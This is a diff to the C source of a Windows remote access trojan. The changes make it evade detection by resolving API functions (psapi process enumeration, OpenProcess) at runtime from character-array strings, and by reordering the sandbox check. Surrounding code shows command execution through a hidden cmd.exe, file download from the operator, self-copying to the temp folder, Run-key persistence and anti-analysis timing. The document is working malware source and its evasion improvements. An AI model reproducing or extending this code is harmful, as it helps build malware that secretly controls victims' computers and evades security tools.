@@ -6,7 +6,7 @@
 #define global static
 #define CRYPT_KEY 28
 
-global HMODULE gLibraryKernel32;
+global HMODULE g_libraryKernel32;
 global _recv* gf_recv;
 global _CreateFileA* gf_CreateFileA;
 global _CloseHandle* gf_CloseHandle;
@@ -75,7 +75,7 @@ FetchInfo(RATSocket* ratSocket)
 	len = sizeof(bufferComputer);
 			
 	char ca_GetComputerNameA[] = { 'G','e','t','C','o','m','p','u','t','e','r','N','a','m','e','A',0 };
-	_GetComputerNameA* f_GetComputerNameA = (_GetComputerNameA*)GetProcAddress(gLibraryKernel32, ca_GetComputerNameA);
+	_GetComputerNameA* f_GetComputerNameA = (_GetComputerNameA*)GetProcAddress(g_libraryKernel32, ca_GetComputerNameA);
 			
 	if ( f_GetComputerNameA(bufferComputer, &len) <= 0 )
 	{
@@ -175,7 +175,7 @@ DownloadFile(RATSocket* ratSocket,
 	DWORD bytesWritten;
 
 	char ca_WriteFile[] = { 'W','r','i','t','e','F','i','l','e',0 };
-	_WriteFile* f_WriteFile = (_WriteFile*)GetProcAddress(gLibraryKernel32, ca_WriteFile);
+	_WriteFile* f_WriteFile = (_WriteFile*)GetProcAddress(g_libraryKernel32, ca_WriteFile);
 	f_WriteFile(fileHandle, totalReceivedData, totalBytesRead, &bytesWritten, 0);
 
 #if DEBUG			
@@ -260,7 +260,7 @@ int RunCommandInProcess(char *commandToRun, int waitForProcess)
 	char* cmdPath = (char*)calloc(cmdPathSize, sizeof(char));
 
 	char ca_GetSystemDirectoryA[] = { 'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A',0 };
-	_GetSystemDirectoryA* f_GetSystemDirectoryA = (_GetSystemDirectoryA*)GetProcAddress(gLibraryKernel32, ca_GetSystemDirectoryA);
+	_GetSystemDirectoryA* f_GetSystemDirectoryA = (_GetSystemDirectoryA*)GetProcAddress(g_libraryKernel32, ca_GetSystemDirectoryA);
 	f_GetSystemDirectoryA(cmdPath, MAX_PATH);
 
 	char ca_cmdexe[] = { '\\','c','m','d','.','e','x','e',0 };
@@ -270,7 +270,7 @@ int RunCommandInProcess(char *commandToRun, int waitForProcess)
 	strncat_s(cmdArg, cmdPathSize, commandToRun, strlen(commandToRun));
 
 	char ca_CreateProcessA[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A',0 };
-	_CreateProcessA* f_CreateProcessA = (_CreateProcessA*)GetProcAddress(gLibraryKernel32, ca_CreateProcessA);
+	_CreateProcessA* f_CreateProcessA = (_CreateProcessA*)GetProcAddress(g_libraryKernel32, ca_CreateProcessA);
 	if ( !f_CreateProcessA(cmdPath, cmdArg, NULL, NULL, FALSE, CREATE_NO_WINDOW , NULL, NULL, &si, &pi) )
 	{
 #if DEBUG				
@@ -285,7 +285,7 @@ int RunCommandInProcess(char *commandToRun, int waitForProcess)
 	if ( waitForProcess )
 	{
 		char ca_WaitForSingleObject[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 };
-		_WaitForSingleObject* f_WaitForSingleObject = (_WaitForSingleObject*)GetProcAddress(gLibraryKernel32, ca_WaitForSingleObject);
+		_WaitForSingleObject* f_WaitForSingleObject = (_WaitForSingleObject*)GetProcAddress(g_libraryKernel32, ca_WaitForSingleObject);
 		f_WaitForSingleObject( pi.hProcess, INFINITE );
 
 		gf_CloseHandle(pi.hProcess);
@@ -315,7 +315,7 @@ ReceiveCmdCommand(RATSocket* ratSocket,
 	char tempPath[MAX_PATH];
 
 	char ca_GetTempPathA[] = { 'G','e','t','T','e','m','p','P','a','t','h','A',0 };
-	_GetTempPathA* f_GetTempPathA = (_GetTempPathA*)GetProcAddress(gLibraryKernel32, ca_GetTempPathA);
+	_GetTempPathA* f_GetTempPathA = (_GetTempPathA*)GetProcAddress(g_libraryKernel32, ca_GetTempPathA);
 	f_GetTempPathA(MAX_PATH, tempPath);
 	
 	char filePath[MAX_PATH];
@@ -347,7 +347,7 @@ void
 CopyAndRunFromTempFolder(char* currentPath, char* newPath)
 {
 	char ca_CopyFileA[] = { 'C','o','p','y','F','i','l','e','A',0 };
-	_CopyFileA* f_CopyFileA = (_CopyFileA*)GetProcAddress(gLibraryKernel32, ca_CopyFileA);
+	_CopyFileA* f_CopyFileA = (_CopyFileA*)GetProcAddress(g_libraryKernel32, ca_CopyFileA);
 
 	if ( f_CopyFileA == NULL )
 	{
@@ -388,7 +388,7 @@ int SetupRegistryKey(const char* execPath)
 	HKEY keyHandle;
 
 	char ca_RegOpenKeyExA[] = { 'R','e','g','O','p','e','n','K','e','y','E','x','A',0 };
-	_RegOpenKeyExA* f_RegOpenKeyExA = (_RegOpenKeyExA*)GetProcAddress(gLibraryKernel32, ca_RegOpenKeyExA);
+	_RegOpenKeyExA* f_RegOpenKeyExA = (_RegOpenKeyExA*)GetProcAddress(g_libraryKernel32, ca_RegOpenKeyExA);
 	LSTATUS regOpenStatus = f_RegOpenKeyExA(HKEY_CURRENT_USER,
 										  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
 										  0, KEY_WRITE, &keyHandle);
@@ -411,7 +411,7 @@ int SetupRegistryKey(const char* execPath)
 	char ca_keyName[] = { 'r','t','w','r','s','t',0 };
 	
 	char ca_RegSetValueExA[] = { 'R','e','g','S','e','t','V','a','l','u','e','E','x','A',0 };
-	_RegSetValueExA* f_RegSetValueExA = (_RegSetValueExA*)GetProcAddress(gLibraryKernel32, ca_RegSetValueExA);
+	_RegSetValueExA* f_RegSetValueExA = (_RegSetValueExA*)GetProcAddress(g_libraryKernel32, ca_RegSetValueExA);
 	LSTATUS regSetStatus = f_RegSetValueExA(keyHandle,
 										  ca_keyName,
 										  0,
@@ -429,7 +429,7 @@ int SetupRegistryKey(const char* execPath)
 	free(regValue);
 
 	char ca_RegCloseKey[] = { 'R','e','g','C','l','o','s','e','K','e','y',0 };
-	_RegCloseKey* f_RegCloseKey = (_RegCloseKey*)GetProcAddress(gLibraryKernel32, ca_RegCloseKey);
+	_RegCloseKey* f_RegCloseKey = (_RegCloseKey*)GetProcAddress(g_libraryKernel32, ca_RegCloseKey);
 	f_RegCloseKey(keyHandle);
 	return 0;
 }
@@ -437,11 +437,16 @@ int SetupRegistryKey(const char* execPath)
 int
 IsInSandbox(void)
 {
+	char ca_psapi[] = { 'P','s','a','p','i','.','d','l','l',0 };
+	HMODULE libraryPsapi = LoadLibraryA(ca_psapi);
+	
 	DWORD processList[1024];
 	DWORD cbNeeded;
 	DWORD numProcesses;
 
-	if ( !EnumProcesses(processList, sizeof(processList), &cbNeeded) )
+	char ca_EnumProcesses[] = { 'E','n','u','m','P','r','o','c','e','s','s','e','s',0 };
+	_EnumProcesses* f_EnumProcesses = (_EnumProcesses*)GetProcAddress(libraryPsapi, ca_EnumProcesses);
+	if ( !f_EnumProcesses(processList, sizeof(processList), &cbNeeded) )
 	{
 #if DEBUG
 		OutputDebugStringA("[ERROR] Could not enumerate process list.");
@@ -462,17 +467,24 @@ IsInSandbox(void)
 			continue;
 		}
 
-		HANDLE processHandle = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
+		char ca_OpenProcess[] = { 'O','p','e','n','P','r','o','c','e','s','s',0 };
+		_OpenProcess* f_OpenProcess = (_OpenProcess*)GetProcAddress(g_libraryKernel32 , ca_OpenProcess);
+		HANDLE processHandle = f_OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
 											FALSE, processId);
 		if ( NULL != processHandle )
 		{
 			HMODULE hModule;
 			DWORD cbNeeded;
 
-			if ( EnumProcessModules( processHandle, &hModule, sizeof(hModule), &cbNeeded) )
+			char ca_EnumProcessModules[] = { 'E','n','u','m','P','r','o','c','e','s','s','M','o','d','u','l','e','s',0 };
+			_EnumProcessModules* f_EnumProcessModules = (_EnumProcessModules*)GetProcAddress(libraryPsapi, ca_EnumProcessModules);
+			if ( f_EnumProcessModules( processHandle, &hModule, sizeof(hModule), &cbNeeded) )
 			{
 				char processName[MAX_PATH];
-				GetModuleBaseNameA( processHandle, hModule, processName, sizeof(processName)/sizeof(char));
+
+				char ca_GetModuleBaseNameA[] = { 'G','e','t','M','o','d','u','l','e','B','a','s','e','N','a','m','e','A',0 };
+				_GetModuleBaseNameA* f_GetModuleBaseNameA = (_GetModuleBaseNameA*)GetProcAddress(libraryPsapi, ca_GetModuleBaseNameA);
+				f_GetModuleBaseNameA( processHandle, hModule, processName, sizeof(processName)/sizeof(char));
 #if DEBUG
 				OutputDebugStringA(processName);
 				OutputDebugStringA("\n");
@@ -512,13 +524,13 @@ WinMain(HINSTANCE hInstance,
 		LPSTR lpCmdLine,
 		int nCmdShow)
 {
+ 	char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
+	g_libraryKernel32 = LoadLibraryA(ca_kernel32);
+	
 	if ( IsInSandbox() )
 	{
 		return 1;
 	}
-	
- 	char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
-	gLibraryKernel32 = LoadLibraryA(ca_kernel32);
 	
 #if !DEBUG	
 	LONGLONG cycleCountDiff;
@@ -527,11 +539,11 @@ WinMain(HINSTANCE hInstance,
 	LARGE_INTEGER performanceFrequency;
 
 	char ca_QueryPerformanceFrequency[] = { 'Q','u','e','r','y','P','e','r','f','o','r','m','a','n','c','e','F','r','e','q','u','e','n','c','y',0 };
-	_QueryPerformanceFrequency* f_QueryPerformanceFrequency = (_QueryPerformanceFrequency*)GetProcAddress(gLibraryKernel32, ca_QueryPerformanceFrequency);
+	_QueryPerformanceFrequency* f_QueryPerformanceFrequency = (_QueryPerformanceFrequency*)GetProcAddress(g_libraryKernel32, ca_QueryPerformanceFrequency);
 	f_QueryPerformanceFrequency(&performanceFrequency);
 
 	char ca_QueryPerformanceCounter[] = { 'Q','u','e','r','y','P','e','r','f','o','r','m','a','n','c','e','C','o','u','n','t','e','r',0 };
-	_QueryPerformanceCounter* f_QueryPerformanceCounter = (_QueryPerformanceCounter*)GetProcAddress(gLibraryKernel32, ca_QueryPerformanceCounter);
+	_QueryPerformanceCounter* f_QueryPerformanceCounter = (_QueryPerformanceCounter*)GetProcAddress(g_libraryKernel32, ca_QueryPerformanceCounter);
 	f_QueryPerformanceCounter(&performanceCounterStart);
 #endif	
 	
@@ -546,7 +558,7 @@ WinMain(HINSTANCE hInstance,
 	char tempPath[MAX_PATH] = { 0 };
 
 	char ca_GetTempPathA[] = { 'G','e','t','T','e','m','p','P','a','t','h','A',0 };
-	_GetTempPathA* f_GetTempPathA = (_GetTempPathA*)GetProcAddress(gLibraryKernel32, ca_GetTempPathA);
+	_GetTempPathA* f_GetTempPathA = (_GetTempPathA*)GetProcAddress(g_libraryKernel32, ca_GetTempPathA);
 	f_GetTempPathA(MAX_PATH, tempPath);
 
 
@@ -596,7 +608,7 @@ WinMain(HINSTANCE hInstance,
 	ratSocket.f_WSAGetLastError = (_WSAGetLastError*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSAGetLastError);
 
 	char ca_CloseHandle[] = { 'C','l','o','s','e','H','a','n','d','l','e',0 };
-	gf_CloseHandle = (_CloseHandle*)GetProcAddress(gLibraryKernel32, ca_CloseHandle);
+	gf_CloseHandle = (_CloseHandle*)GetProcAddress(g_libraryKernel32, ca_CloseHandle);
 
 #if !DEBUG
 	f_QueryPerformanceCounter(&performanceCounterCurrent);
@@ -705,17 +717,17 @@ WinMain(HINSTANCE hInstance,
 	
 	//char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
 
-	gLibraryKernel32 = LoadLibraryA(ca_kernel32);
-	if ( !gLibraryKernel32 )
+	g_libraryKernel32 = LoadLibraryA(ca_kernel32);
+	if ( !g_libraryKernel32 )
 	{
 #if DEBUG				
-		OutputDebugStringA("Loading gLibraryKernel32 failed.\n");
+		OutputDebugStringA("Loading g_libraryKernel32 failed.\n");
 #endif		
 		return 1;
 	}
 
 	char ca_CreateFileA[] = { 'C','r','e','a','t','e','F','i','l','e','A',0 };
-	gf_CreateFileA = (_CreateFileA*)GetProcAddress(gLibraryKernel32, ca_CreateFileA);
+	gf_CreateFileA = (_CreateFileA*)GetProcAddress(g_libraryKernel32, ca_CreateFileA);
 	
 	for(;;)
 	{
